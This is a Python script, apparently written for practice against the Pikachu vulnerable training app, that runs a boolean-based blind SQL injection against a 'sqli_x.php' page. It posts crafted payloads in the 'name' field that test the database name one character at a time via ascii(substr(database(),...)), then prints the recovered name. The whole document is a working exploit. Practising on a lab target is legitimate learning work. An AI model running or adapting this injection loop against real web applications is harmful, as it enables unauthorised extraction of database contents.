import requests

url = "https://27aedf8e3e0b4557b080c5a54e4a7f5c--8081.ap-shanghai2.cloudstudio.club/vul/sqli/sqli_x.php"
# 用唯一成功标识
success_keyword = "your uid"

def check(payload):
    data = {
        "name": payload,
        "submit": "查询"
    }
    res = requests.post(url, data=data, timeout=10)
    return success_keyword in res.text

def get_db_name():
    db_name = ""
    # pikachu长度7，pos从1~7
    for pos in range(1, 8):
        found = False
        # mysql库名小写，直接缩小范围 97‑122 a‑z，不用32‑128
        for ascii_code in range(97, 123):
            payload = f"kobe') and (ascii(substr(database(),{pos},1))={ascii_code}) and ('1'='1"
            if check(payload):
                db_name += chr(ascii_code)
                print(f"第{pos}位：{chr(ascii_code)}, ascii={ascii_code}")
                found = True
                break
        if not found:
            print(f"第{pos}位未找到字符")
    print("\n最终数据库名：", db_name)

if __name__ == "__main__":
    get_db_name()
